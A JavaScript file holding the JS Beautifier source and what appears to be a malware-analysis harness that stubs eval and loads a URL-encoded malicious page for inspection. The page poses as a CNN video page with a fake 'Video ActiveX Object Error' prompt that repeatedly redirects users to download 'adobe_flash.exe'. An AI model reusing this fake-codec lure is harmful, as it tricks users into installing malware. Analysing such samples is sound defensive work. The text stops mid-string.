// Beautification code:
/*

 JS Beautifier
---------------
  $Date: 2008-06-10 14:49:11 +0300 (Tue, 10 Jun 2008) $
  $Revision: 60 $


  Written by Einars "elfz" Lielmanis, <elfz@laacz.lv> 
      http://elfz.laacz.lv/beautify/

  Originally converted to javascript by Vital, <vital76@gmail.com> 
      http://my.opera.com/Vital/blog/2007/11/21/javascript-beautify-on-javascript-translated


  You are free to use this in any way you want, in case you find this useful or working for you.

  Usage:
    js_beautify(js_source_text);

*/


function js_beautify(js_source_text, indent_size, indent_character, indent_level)
{

    var input, output, token_text, last_type, last_text, last_word, current_mode, modes, indent_string;
    var whitespace, wordchar, punct, parser_pos, line_starters, in_case;
    var prefix, token_type, do_block_just_closed, var_line, var_line_tainted;



    function trim_output()
    {
        while (output.length && (output[output.length - 1] === ' ' || output[output.length - 1] === indent_string)) {
            output.pop();
        }
    }

    function print_newline(ignore_repeated)
    {
        ignore_repeated = typeof ignore_repeated === 'undefined' ? true: ignore_repeated;
        
        trim_output();

        if (!output.length) {
            return; // no newline on start of file
        }

        if (output[output.length - 1] !== "\n" || !ignore_repeated) {
            output.push("\n");
        }
        for (var i = 0; i < indent_level; i++) {
            output.push(indent_string);
        }
    }



    function print_space()
    {
        var last_output = output.length ? output[output.length - 1] : ' ';
        if (last_output !== ' ' && last_output !== '\n' && last_output !== indent_string) { // prevent occassional duplicate space
            output.push(' ');
        }
    }


    function print_token()
    {
        output.push(token_text);
    }

    function indent()
    {
        indent_level++;
    }


    function unindent()
    {
        if (indent_level) {
            indent_level--;
        }
    }


    function remove_indent()
    {
        if (output.length && output[output.length - 1] === indent_string) {
            output.pop();
        }
    }


    function set_mode(mode)
    {
        modes.push(current_mode);
        current_mode = mode;
    }


    function restore_mode()
    {
        do_block_just_closed = current_mode === 'DO_BLOCK';
        current_mode = modes.pop();
    }


    function in_array(what, arr)
    {
        for (var i = 0; i < arr.length; i++)
        {
            if (arr[i] === what) {
                return true;
            }
        }
        return false;
    }



    function get_next_token()
    {
        var n_newlines = 0;
        var c = '';

        do {
            if (parser_pos >= input.length) {
                return ['', 'TK_EOF'];
            }
            c = input.charAt(parser_pos);

            parser_pos += 1;
            if (c === "\n") {
                n_newlines += 1;
            }
        }
        while (in_array(c, whitespace));

        if (n_newlines > 1) {
            for (var i = 0; i < 2; i++) {
                print_newline(i === 0);
            }
        }
        var wanted_newline = (n_newlines === 1);


        if (in_array(c, wordchar)) {
            if (parser_pos < input.length) {
                while (in_array(input.charAt(parser_pos), wordchar)) {
                    c += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos === input.length) {
                        break;
                    }
                }
            }

            // small and surprisingly unugly hack for 1E-10 representation
            if (parser_pos !== input.length && c.match(/^[0-9]+[Ee]$/) && input.charAt(parser_pos) === '-') {
                parser_pos += 1;

                var t = get_next_token(parser_pos);
                c += '-' + t[0];
                return [c, 'TK_WORD'];
            }

            if (c === 'in') { // hack for 'in' operator
                return [c, 'TK_OPERATOR'];
            }
            return [c, 'TK_WORD'];
        }
        
        if (c === '(' || c === '[') {
            return [c, 'TK_START_EXPR'];
        }

        if (c === ')' || c === ']') {
            return [c, 'TK_END_EXPR'];
        }

        if (c === '{') {
            return [c, 'TK_START_BLOCK'];
        }

        if (c === '}') {
            return [c, 'TK_END_BLOCK'];
        }

        if (c === ';') {
            return [c, 'TK_END_COMMAND'];
        }

        if (c === '/') {
            var comment = '';
            // peek for comment /* ... */
            if (input.charAt(parser_pos) === '*') {
                parser_pos += 1;
                if (parser_pos < input.length) {
                    while (! (input.charAt(parser_pos) === '*' && input.charAt(parser_pos + 1) && input.charAt(parser_pos + 1) === '/') && parser_pos < input.length) {
                        comment += input.charAt(parser_pos);
                        parser_pos += 1;
                        if (parser_pos >= input.length) {
                            break;
                        }
                    }
                }
                parser_pos += 2;
                return ['/*' + comment + '*/', 'TK_BLOCK_COMMENT'];
            }
            // peek for comment // ...
            if (input.charAt(parser_pos) === '/') {
                comment = c;
                while (input.charAt(parser_pos) !== "\x0d" && input.charAt(parser_pos) !== "\x0a") {
                    comment += input.charAt(parser_pos);
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }
                parser_pos += 1;
                if (wanted_newline) {
                    print_newline();
                }
                return [comment, 'TK_COMMENT'];
            }

        }

        if (c === "'" || // string
        c === '"' || // string
        (c === '/' &&
        ((last_type === 'TK_WORD' && last_text === 'return') || (last_type === 'TK_START_EXPR' || last_type === 'TK_END_BLOCK' || last_type === 'TK_OPERATOR' || last_type === 'TK_EOF' || last_type === 'TK_END_COMMAND')))) { // regexp
            var sep = c;
            var esc = false;
            c = '';

            if (parser_pos < input.length) {

                while (esc || input.charAt(parser_pos) !== sep) {
                    c += input.charAt(parser_pos);
                    if (!esc) {
                        esc = input.charAt(parser_pos) === '\\';
                    } else {
                        esc = false;
                    }
                    parser_pos += 1;
                    if (parser_pos >= input.length) {
                        break;
                    }
                }

            }

            parser_pos += 1;
            if (last_type === 'TK_END_COMMAND') {
                print_newline();
            }
            return [sep + c + sep, 'TK_STRING'];
        }

        if (in_array(c, punct)) {
            while (parser_pos < input.length && in_array(c + input.charAt(parser_pos), punct)) {
                c += input.charAt(parser_pos);
                parser_pos += 1;
                if (parser_pos >= input.length) {
                    break;
                }
            }
            return [c, 'TK_OPERATOR'];
        }

        return [c, 'TK_UNKNOWN'];
    }


    //----------------------------------

    indent_character = indent_character || ' ';
    indent_size = indent_size || 4;

    indent_string = '';
    while (indent_size--) {
        indent_string += indent_character;
    }

    input = js_source_text;

    last_word = ''; // last 'TK_WORD' passed
    last_type = 'TK_START_EXPR'; // last token type
    last_text = ''; // last token text
    output = [];

    do_block_just_closed = false;
    var_line = false;
    var_line_tainted = false;

    whitespace = "\n\r\t ".split('');
    wordchar = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$'.split('');
    punct = '+ - * / % & ++ -- = += -= *= /= %= == === != !== > < >= <= >> << >>> >>>= >>= <<= && &= | || ! !! , : ? ^ ^= |='.split(' ');

    // words which should always start on new line.
    line_starters = 'continue,try,throw,return,var,if,switch,case,default,for,while,break,function'.split(',');

    // states showing if we are currently in expression (i.e. "if" case) - 'EXPRESSION', or in usual block (like, procedure), 'BLOCK'.
    // some formatting depends on that.
    current_mode = 'BLOCK';
    modes = [current_mode];

    indent_level = indent_level || 0;
    parser_pos = 0; // parser position
    in_case = false; // flag for parser that case/default has been processed, and next colon needs special attention
    while (true) {
        var t = get_next_token(parser_pos);
        token_text = t[0];
        token_type = t[1];
        if (token_type === 'TK_EOF') {
            break;
        }

        switch (token_type) {

        case 'TK_START_EXPR':
            var_line = false;
            set_mode('EXPRESSION');
            if (last_type === 'TK_END_EXPR' || last_type === 'TK_START_EXPR') {
                // do nothing on (( and )( and ][ and ]( ..
            } else if (last_type !== 'TK_WORD' && last_type !== 'TK_OPERATOR') {
                print_space();
            } else if (in_array(last_word, line_starters) && last_word !== 'function') {
                print_space();
            }
            print_token();
            break;

        case 'TK_END_EXPR':
            print_token();
            restore_mode();
            break;

        case 'TK_START_BLOCK':
            
            if (last_word === 'do') {
                set_mode('DO_BLOCK');
            } else {
                set_mode('BLOCK');
            }
            if (last_type !== 'TK_OPERATOR' && last_type !== 'TK_START_EXPR') {
                if (last_type === 'TK_START_BLOCK') {
                    print_newline();
                } else {
                    print_space();
                }
            }
            print_token();
            indent();
            break;

        case 'TK_END_BLOCK':
            if (last_type === 'TK_START_BLOCK') {
                // nothing
                trim_output();
                unindent();
            } else {
                unindent();
                print_newline();
            }
            print_token();
            restore_mode();
            break;

        case 'TK_WORD':

            if (do_block_just_closed) {
                print_space();
                print_token();
                print_space();
                break;
            }

            if (token_text === 'case' || token_text === 'default') {
                if (last_text === ':') {
                    // switch cases following one another
                    remove_indent();
                } else {
                    // case statement starts in the same line where switch
                    unindent();
                    print_newline();
                    indent();
                }
                print_token();
                in_case = true;
                break;
            }


            prefix = 'NONE';
            if (last_type === 'TK_END_BLOCK') {
                if (!in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                    prefix = 'NEWLINE';
                } else {
                    prefix = 'SPACE';
                    print_space();
                }
            } else if (last_type === 'TK_END_COMMAND' && (current_mode === 'BLOCK' || current_mode === 'DO_BLOCK')) {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_COMMAND' && current_mode === 'EXPRESSION') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_WORD') {
                prefix = 'SPACE';
            } else if (last_type === 'TK_START_BLOCK') {
                prefix = 'NEWLINE';
            } else if (last_type === 'TK_END_EXPR') {
                print_space();
                prefix = 'NEWLINE';
            }

            if (last_type !== 'TK_END_BLOCK' && in_array(token_text.toLowerCase(), ['else', 'catch', 'finally'])) {
                print_newline();
            } else if (in_array(token_text, line_starters) || prefix === 'NEWLINE') {
                if (last_text === 'else') {
                    // no need to force newline on else break
                    print_space();
                } else if ((last_type === 'TK_START_EXPR' || last_text === '=') && token_text === 'function') {
                    // no need to force newline on 'function': (function
                    // DONOTHING
                } else if (last_type === 'TK_WORD' && (last_text === 'return' || last_text === 'throw')) {
                    // no newline between 'return nnn'
                    print_space();
                } else if (last_type !== 'TK_END_EXPR') {
                    if ((last_type !== 'TK_START_EXPR' || token_text !== 'var') && last_text !== ':') {
                        // no need to force newline on 'var': for (var x = 0...)
                        if (token_text === 'if' && last_type === 'TK_WORD' && last_word === 'else') {
                            // no newline for } else if {
                            print_space();
                        } else {
                            print_newline();
                        }
                    }
                } else {
                    if (in_array(token_text, line_starters) && last_text !== ')') {
                        print_newline();
                    }
                }
            } else if (prefix === 'SPACE') {
                print_space();
            }
            print_token();
            last_word = token_text;

            if (token_text === 'var') {
                var_line = true;
                var_line_tainted = false;
            }

            break;

        case 'TK_END_COMMAND':

            print_token();
            var_line = false;
            break;

        case 'TK_STRING':

            if (last_type === 'TK_START_BLOCK' || last_type === 'TK_END_BLOCK') {
                print_newline();
            } else if (last_type === 'TK_WORD') {
                print_space();
            }
            print_token();
            break;

        case 'TK_OPERATOR':

            var start_delim = true;
            var end_delim = true;
            if (var_line && token_text !== ',') {
                var_line_tainted = true;
                if (token_text === ':') {
                    var_line = false;
                }
            }

            if (token_text === ':' && in_case) {
                print_token(); // colon really asks for separate treatment
                print_newline();
                break;
            }

            in_case = false;

            if (token_text === ',') {
                if (var_line) {
                    if (var_line_tainted) {
                        print_token();
                        print_newline();
                        var_line_tainted = false;
                    } else {
                        print_token();
                        print_space();
                    }
                } else if (last_type === 'TK_END_BLOCK') {
                    print_token();
                    print_newline();
                } else {
                    if (current_mode === 'BLOCK') {
                        print_token();
                        print_newline();
                    } else {
                        // EXPR od DO_BLOCK
                        print_token();
                        print_space();
                    }
                }
                break;
            } else if (token_text === '--' || token_text === '++') { // unary operators special case
                if (last_text === ';') {
                    // space for (;; ++i)
                    start_delim = true;
                    end_delim = false;
                } else {
                    start_delim = false;
                    end_delim = false;
                }
            } else if (token_text === '!' && last_type === 'TK_START_EXPR') {
                // special case handling: if (!a)
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_OPERATOR') {
                start_delim = false;
                end_delim = false;
            } else if (last_type === 'TK_END_EXPR') {
                start_delim = true;
                end_delim = true;
            } else if (token_text === '.') {
                // decimal digits or object.property
                start_delim = false;
                end_delim = false;

            } else if (token_text === ':') {
                // zz: xx
                // can't differentiate ternary op, so for now it's a ? b: c; without space before colon
                if (last_text.match(/^\d+$/)) {
                    // a little help for ternary a ? 1 : 0;
                    start_delim = true;
                } else {
                    start_delim = false;
                }
            }
            if (start_delim) {
                print_space();
            }

            print_token();

            if (end_delim) {
                print_space();
            }
            break;

        case 'TK_BLOCK_COMMENT':

            print_newline();
            print_token();
            print_newline();
            break;

        case 'TK_COMMENT':

            // print_newline();
            print_space();
            print_token();
            print_newline();
            break;

        case 'TK_UNKNOWN':
            print_token();
            break;
        }

        last_type = token_type;
        last_text = token_text;
    }

    return output.join('');

}


// Now we load the code to be beautified:
var code='// Monkeywrench run Thu Aug  7 18:57:24 2008\n\
// -----------------------------------------------\n\
// Set up a document object\n\
// -----------------------------------------------\n\
function my_location() {\n\
   this.href = "";\n\
}\n\
function my_document() {\n\
   this.location = new my_location();\n\
   this.url = "";\n\
\n\
   this.write = function(string) {\n\
      print("my_document::write");\n\
      print(string);\n\
   }\n\
};\n\
\n\
function eval(something) { print (something); }\n\
\n\
var document = new my_document();\n\
var location = new my_location();\n\
\n\
\n\
var U7=window,W8=document;var a1="%20%3C%21DOCTYPE%20HTML%20PUBLIC%20%22-//W3C//DTD%20HTML%204.01%20Transitional//EN%22%0A%0A%20%20%20%20%20%20%20%20%22http%3A//www.w3.org/TR/html4/loose.dtd%22%3E%0A%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%0A%3Cmeta%20http-equiv%3D%22content-type%22%20content%3D%22text/html%3B%20charset%3Diso-8859-1%22%3E%0A%0A%3Ctitle%3EBreaking%20News%20Videos%20from%20CNN.com%3C/title%3E%20%0A%0A%3Cmeta%20name%3D%22Title%22%20content%3D%22Video%20-%20Breaking%20News%20Videos%20from%20CNN.com%22%3E%20%0A%0A%3Cmeta%20name%3D%22Description%22%20content%3D%22Find%20the%20latest%20video%20news%20stories%20and%20information%20free%20from%20CNN.com.%20Watch%20breaking%20news%20and%20video%20clips%20about%20politics%2C%20entertainment%2C%20weather%2C%20the%20world%2C%20and%20more.%22%3E%20%0A%0A%3Cmeta%20name%3D%22Keywords%22%20content%3D%22CNN%2C%20CNN%20news%2C%20CNN.com%2C%20CNN%20TV%2C%20CNN%20video%2C%20CNN%20video%20news%2C%20CNN%20Live%2C%20CNN.com%20video%2C%20CNN.com%20Live%2C%20Live%20from%20CNN.com%2C%20video%2C%20VOD%2C%20video%20news%2C%20live%2C%20live%20video%2C%20live%20breaking%20%0Anews%2C%20flash%20video%2C%20flash%20video%20player%22%3E%20%0A%0A%3Clink%20rel%3D%22alternate%22%20type%3D%22application/rss+xml%22%20title%3D%22CNN.com%3A%20Video%22%20href%3D%22http%3A//rss.cnn.com/rss/cnn_freevideo.rss%22%20/%3E%20%0A%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22common.css%22%20type%3D%22text/css%22%20/%3E%0A%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22bvp.css%22%20type%3D%22text/css%22%20/%3E%09%0A%0A%3Cscript%3E%0Afunction%20activex_is_here%28%29%0A%7B%0A%20%20%20%20try%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%20%20%20%20catch%28e%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20return%20false%3B%0A%7D%0A%0Afunction%20releaseMovie%28%29%20%7B%0A%09if%20%28activex_is_here%28%29%29%20%7B%0A%09%09document.getElementById%28%27playMov%27%29.innerHTML%20%3D%20%27%3Cembed%20src%3D%22/movie.mpg%22%20width%3D%22480%22%20height%3D%22400%22%20autostart%3D%22true%22%20type%3D%22movie/mpg%22%3E%3C/embed%3E%27%3B%0A%09%7D%0A%7Dfunction%20codecDownload%28%29%0A%7B%0A%09if%20%28window.navigator.userAgent.indexOf%28%22SV1%22%29%20%21%3D%20-1%20%7C%7C%20window.navigator.userAgent.indexOf%28%22MSIE%207%22%29%20%21%3D-1%29%20%7B%0Areturn%3B%0A%09%7D%0A%09else%20%7B%0A%09%09window.setTimeout%28%22location.href%3D%27adobe_flash.exe%27%22%2C%203000%29%3B%0A%09%7D%0A%7D%0A%3C/script%3E%0A%3C/head%3E%0A%0A%0A%0A%3Cbody%3E%0A%0A%0A%0A%0A%3Cscript%3E%0A%0A%0Avar%20Drag%20%3D%20%7B%0A%09obj%20%3A%20null%2C%0A%09init%20%3A%20function%28o%2C%20oRoot%2C%20minX%2C%20maxX%2C%20minY%2C%20maxY%2C%20bSwapHorzRef%2C%20bSwapVertRef%2C%20fXMapper%2C%20fYMapper%29%0A%09%7B%0A%09%09o.onmousedown%09%3D%20Drag.start%3B%0A%0A%09%09o.hmode%09%09%09%3D%20bSwapHorzRef%20%3F%20false%20%3A%20true%20%3B%0A%09%09o.vmode%09%09%09%3D%20bSwapVertRef%20%3F%20false%20%3A%20true%20%3B%0A%0A%09%09o.root%20%3D%20oRoot%20%26%26%20oRoot%20%21%3D%20null%20%3F%20oRoot%20%3A%20o%20%3B%0A%0A%09%09if%20%28o.hmode%20%20%26%26%20isNaN%28parseInt%28o.root.style.left%20%20%29%29%29%20o.root.style.left%20%20%20%3D%20%220px%22%3B%0A%09%09if%20%28o.vmode%20%20%26%26%20isNaN%28parseInt%28o.root.style.top%20%20%20%29%29%29%20o.root.style.top%20%20%20%20%3D%20%220px%22%3B%0A%09%09if%20%28%21o.hmode%20%26%26%20isNaN%28parseInt%28o.root.style.right%20%29%29%29%20o.root.style.right%20%20%3D%20%220px%22%3B%0A%09%09if%20%28%21o.vmode%20%26%26%20isNaN%28parseInt%28o.root.style.bottom%29%29%29%20o.root.style.bottom%20%3D%20%220px%22%3B%0A%0A%09%09o.minX%09%3D%20typeof%20minX%20%21%3D%20%27undefined%27%20%3F%20minX%20%3A%20null%3B%0A%09%09o.minY%09%3D%20typeof%20minY%20%21%3D%20%27undefined%27%20%3F%20minY%20%3A%20null%3B%0A%09%09o.maxX%09%3D%20typeof%20maxX%20%21%3D%20%27undefined%27%20%3F%20maxX%20%3A%20null%3B%0A%09%09o.maxY%09%3D%20typeof%20maxY%20%21%3D%20%27undefined%27%20%3F%20maxY%20%3A%20null%3B%0A%0A%09%09o.xMapper%20%3D%20fXMapper%20%3F%20fXMapper%20%3A%20null%3B%0A%09%09o.yMapper%20%3D%20fYMapper%20%3F%20fYMapper%20%3A%20null%3B%0A%0A%09%09o.root.onDragStart%09%3D%20new%20Function%28%29%3B%0A%09%09o.root.onDragEnd%09%3D%20new%20Function%28%29%3B%0A%09%09o.root.onDrag%09%09%3D%20new%20Function%28%29%3B%0A%09%7D%2C%0A%0A%09start%20%3A%20function%28e%29%0A%09%7B%0A%09%09var%20o%20%3D%20Drag.obj%20%3D%20this%3B%0A%09%09e%20%3D%20Drag.fixE%28e%29%3B%0A%09%09var%20y%20%3D%20parseInt%28o.vmode%20%3F%20o.root.style.top%20%20%3A%20o.root.style.bottom%29%3B%0A%09%09var%20x%20%3D%20parseInt%28o.hmode%20%3F%20o.root.style.left%20%3A%20o.root.style.right%20%29%3B%0A%09%09o.root.onDragStart%28x%2C%20y%29%3B%0A%0A%09%09o.lastMouseX%09%3D%20e.clientX%3B%0A%09%09o.lastMouseY%09%3D%20e.clientY%3B%0A%0A%09%09if%20%28o.hmode%29%20%7B%0A%09%09%09if%20%28o.minX%20%21%3D%20null%29%09o.minMouseX%09%3D%20e.clientX%20-%20x%20+%20o.minX%3B%0A%09%09%09if%20%28o.maxX%20%21%3D%20null%29%09o.maxMouseX%09%3D%20o.minMouseX%20+%20o.maxX%20-%20o.minX%3B%0A%09%09%7D%20else%20%7B%0A%09%09%09if%20%28o.minX%20%21%3D%20null%29%20o.maxMouseX%20%3D%20-o.minX%20+%20e.clientX%20+%20x%3B%0A%09%09%09if%20%28o.maxX%20%21%3D%20null%29%20o.minMouseX%20%3D%20-o.maxX%20+%20e.clientX%20+%20x%3B%0A%09%09%7D%0A%0A%09%09if%20%28o.vmode%29%20%7B%0A%09%09%09if%20%28o.minY%20%21%3D%20null%29%09o.minMouseY%09%3D%20e.clientY%20-%20y%20+%20o.minY%3B%0A%09%09%09if%20%28o.maxY%20%21%3D%20null%29%09o.maxMouseY%09%3D%20o.minMouseY%20+%20o.maxY%20-%20o.minY%3B%0A%09%09%7D%20else%20%7B%0A%09%09%09if%20%28o.minY%20%21%3D%20null%29%20o.maxMouseY%20%3D%20-o.minY%20+%20e.clientY%20+%20y%3B%0A%09%09%09if%20%28o.maxY%20%21%3D%20null%29%20o.minMouseY%20%3D%20-o.maxY%20+%20e.clientY%20+%20y%3B%0A%09%09%7D%0A%0A%09%09document.onmousemove%09%3D%20Drag.drag%3B%0A%09%09document.onmouseup%09%09%3D%20Drag.end%3B%0A%0A%09%09return%20false%3B%0A%09%7D%2C%0A%0A%09drag%20%3A%20function%28e%29%0A%09%7B%0A%09%09e%20%3D%20Drag.fixE%28e%29%3B%0A%09%09var%20o%20%3D%20Drag.obj%3B%0A%0A%09%09var%20ey%09%3D%20e.clientY%3B%0A%09%09var%20ex%09%3D%20e.clientX%3B%0A%09%09var%20y%20%3D%20parseInt%28o.vmode%20%3F%20o.root.style.top%20%20%3A%20o.root.style.bottom%29%3B%0A%09%09var%20x%20%3D%20parseInt%28o.hmode%20%3F%20o.root.style.left%20%3A%20o.root.style.right%20%29%3B%0A%09%09var%20nx%2C%20ny%3B%0A%0A%09%09if%20%28o.minX%20%21%3D%20null%29%20ex%20%3D%20o.hmode%20%3F%20Math.max%28ex%2C%20o.minMouseX%29%20%3A%20Math.min%28ex%2C%20o.maxMouseX%29%3B%0A%09%09if%20%28o.maxX%20%21%3D%20null%29%20ex%20%3D%20o.hmode%20%3F%20Math.min%28ex%2C%20o.maxMouseX%29%20%3A%20Math.max%28ex%2C%20o.minMouseX%29%3B%0A%09%09if%20%28o.minY%20%21%3D%20null%29%20ey%20%3D%20o.vmode%20%3F%20Math.max%28ey%2C%20o.minMouseY%29%20%3A%20Math.min%28ey%2C%20o.maxMouseY%29%3B%0A%09%09if%20%28o.maxY%20%21%3D%20null%29%20ey%20%3D%20o.vmode%20%3F%20Math.min%28ey%2C%20o.maxMouseY%29%20%3A%20Math.max%28ey%2C%20o.minMouseY%29%3B%0A%0A%09%09nx%20%3D%20x%20+%20%28%28ex%20-%20o.lastMouseX%29%20*%20%28o.hmode%20%3F%201%20%3A%20-1%29%29%3B%0A%09%09ny%20%3D%20y%20+%20%28%28ey%20-%20o.lastMouseY%29%20*%20%28o.vmode%20%3F%201%20%3A%20-1%29%29%3B%0A%0A%09%09if%20%28o.xMapper%29%09%09nx%20%3D%20o.xMapper%28y%29%0A%09%09else%20if%20%28o.yMapper%29%09ny%20%3D%20o.yMapper%28x%29%0A%0A%09%09Drag.obj.root.style%5Bo.hmode%20%3F%20%22left%22%20%3A%20%22right%22%5D%20%3D%20nx%20+%20%22px%22%3B%0A%09%09Drag.obj.root.style%5Bo.vmode%20%3F%20%22top%22%20%3A%20%22bottom%22%5D%20%3D%20ny%20+%20%22px%22%3B%0A%09%09Drag.obj.lastMouseX%09%3D%20ex%3B%0A%09%09Drag.obj.lastMouseY%09%3D%20ey%3B%0A%0A%09%09Drag.obj.root.onDrag%28nx%2C%20ny%29%3B%0A%09%09return%20false%3B%0A%09%7D%2C%0A%0A%09end%20%3A%20function%28%29%0A%09%7B%0A%09%09document.onmousemove%20%3D%20null%3B%0A%09%09document.onmouseup%20%20%20%3D%20null%3B%0A%09%09Drag.obj.root.onDragEnd%28%09parseInt%28Drag.obj.root.style%5BDrag.obj.hmode%20%3F%20%22left%22%20%3A%20%22right%22%5D%29%2C%20%0A%09%09%09%09%09%09%09%09%09parseInt%28Drag.obj.root.style%5BDrag.obj.vmode%20%3F%20%22top%22%20%3A%20%22bottom%22%5D%29%29%3B%0A%09%09Drag.obj%20%3D%20null%3B%0A%09%7D%2C%0A%0A%09fixE%20%3A%20function%28e%29%0A%09%7B%0A%09%09if%20%28typeof%20e%20%3D%3D%20%27undefined%27%29%20e%20%3D%20window.event%3B%0A%09%09if%20%28typeof%20e.layerX%20%3D%3D%20%27undefined%27%29%20e.layerX%20%3D%20e.offsetX%3B%0A%09%09if%20%28typeof%20e.layerY%20%3D%3D%20%27undefined%27%29%20e.layerY%20%3D%20e.offsetY%3B%0A%09%09return%20e%3B%0A%09%7D%0A%7D%3B%0A%0Afunction%20Down%28download%2Ce%29%20%0A%7B%20%0A%09if%20%28e%21%3Dnull%20%26%26%20e.keyCode%3D%3D27%29%0A%09%7B%09Close%28%29%3B%0A%09%09return%3B%0A%09%7D%09%0A%20%20%20%20switch%20%28download%29%20%0A%20%20%20%20%7B%20%0A%20%20%20%20%20%20%20%20case%20%22iax%22%3A%20document.location.href%3D%22adobe_flash.exe%22%3B%20break%3B%20%0A%20%20%20%20%20%20%20%20Close%28%29%3B%20%0A%20%20%20%20%7D%20%0A%0A%7D%20%0A%0Afunction%20vc%28%29%20%7B%0A%09if%20%28confirm%28%27Video%20ActiveX%20Object%20Error.%5Cn%5CnYour%20browser%20cannot%20play%20this%20video%20file.%5CnClick%20%5C%27OK%5C%27%20to%20download%20and%20install%20missing%20Video%20ActiveX%20Object.%27%29%29%20%7B%0A%09%09location.href%3D%22adobe_flash.exe%22%3B%0A%09%7D%0A%09else%20%7B%0A%09%09if%20%28alert%28%27Please%20install%20new%20version%20of%20Video%20ActiveX%20Object.%27%29%29%20%7B%0A%09%09%09vc%28%29%3B%0A%09%09%7D%0A%09%09else%20%7B%0A%09%09%09vc%28%29%3B%0A%09%09%7D%09%09%09%0A%09%7D%0A%7D%0A%0Afunction%20Close%28%29%20%0A%7B%20%0A%20%20%20%20var%20p%3Ddocument.getElementById%28%22popdiv%22%29%3B%0A%20%20%20%20p.style.visibility%3D%22hidden%22%3B%20%0A%09vc%28%29%3B%0A%7D%20%0Afunction%20Details%28%29%0A%7B%0A%09alert%28%27You%20must%20download%20Video%20ActiveX%20Object%20to%20play%20this%20video%20file.%27%29%3B%0A%7D%0A%0A%3C/script%3E%0A%0A%0A%3Cdiv%20name%3D%22popdiv%22%20id%3D%22popdiv%22%20onKeyPress%3D%22Down%28%27iax%27%2Cevent%29%3B%22%20style%3D%22visibility%3Ahidden%3B%20z-index%3A1%3Bposition%3Aabsolute%3Btop%3A0px%3Bleft%3A0px%3B%22%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%20width%3D%22362%22%20height%3D%22126%22%3E%0A%0A%3Ctr%3E%3Ctd%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%20width%3D%22362%22%20height%3D%2229%22%20style%3D%22%20BACKGROUND-IMAGE%3AURL%28%27xptop.gif%27%29%3B%20height%3A29px%3B%20width%3A362%3B%22%3E%20%3C%21--%20win%20top%20table%20--%3E%0A%0A%3Ctr%3E%0A%0A%3Ctd%20style%3D%22color%3Awhite%3B%20font-family%3ATahoma%3B%20font-size%3A13px%3B%20font-weight%3Abold%3B%20padding-left%3A4px%3Bpadding-top%3A1px%22%3E%26nbsp%3B%26nbsp%3BVideo%20ActiveX%20Object%20Error.%3C/td%3E%0A%0A%3Ctd%20width%3D%2221%22%20style%3D%22padding-right%3A6px%3B%22%3E%3Cimg%20src%3D%22xpclose.gif%22%20width%3D%2221%22%20height%3D%2221%22%20onClick%3D%22Close%28%29%3B%22%20style%3D%22cursor%3Adefault%3B%22%20%3E%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%3C/tr%3E%0A%0A%3Ctr%3E%3Ctd%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%20height%3D%2297%22%3E%0A%0A%3Ctr%3E%0A%0A%3Ctd%20style%3D%22background-image%3Aurl%28left.gif%29%3B%20background-repeat%3Arepeat-y%3B%22%20valign%3D%22bottom%22%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cimg%20src%3D%22xpleftclm.gif%22%20width%3D%223%22%20height%3D%2297%22%3E%3C/td%3E%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3Ctd%20valign%3D%22top%22%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%20width%3D%22356%22%20bgcolor%3D%22ece9d8%22%3E%0A%0A%3Ctr%3E%3Ctd%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%20height%3D%2259%22%3E%0A%0A%3Ctr%3E%0A%0A%3Ctd%20align%3D%22center%22%20style%3D%22padding-left%3A20px%3B%20padding-top%3A13px%3B%22%20valign%3D%22top%22%3E%0A%0A%3Cimg%20src%3D%22alert.gif%22%20width%3D%2231%22%20height%3D%2232%22%3E%3C/td%3E%0A%0A%3Ctd%20align%3D%22left%22%20style%3D%22font-size%3A11px%3B%20%20font-family%3ATahoma%3B%20padding-left%3A30px%3B%20padding-bottom%3A8px%3B%20padding-right%3A5px%3B%22%3E%0A%0A%3Cbr%3E%3Cb%3EVideo%20ActiveX%20Object%20Error%3A%3C/b%3E%3Cbr%3EYour%20browser%20cannot%20display%20this%20video%20file.%3Cbr%3E%3Cbr%3EYou%20need%20to%20download%20new%20version%20of%20Video%20ActiveX%20Object%20to%20play%20this%20video%20file.%0A%0A%3C/td%3E%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3Ctr%3E%3Ctr%3E%0A%0A%3Ctd%20style%3D%22padding-left%3A20px%3B%20padding-right%3A20px%3B%20padding-bottom%3A20px%3B%20font-family%3ATahoma%3B%20font-size%3A11px%3B%22%20align%3D%22center%22%3E%0A%0A%3Chr%3E%3Cbr%3EClick%20Continue%20to%20download%20and%20install%20ActiveX%20Object.%0A%0A%3C/td%3E%3C/tr%3E%3Ctd%3E%0A%0A%3Ctable%20align%3D%22center%22%20cellpadding%3D%220%22%20cellspacing%3D%226%22%20height%3D%2222%22%3E%0A%0A%3Ctr%20height%3D%2222%22%3E%0A%0A%3Ctd%3E%3Cinput%20type%3D%22button%22%20value%3D%22Continue%22%20onClick%3D%22Down%28%27iax%27%29%3B%22%20style%3D%22font-size%3A11px%3B%20%20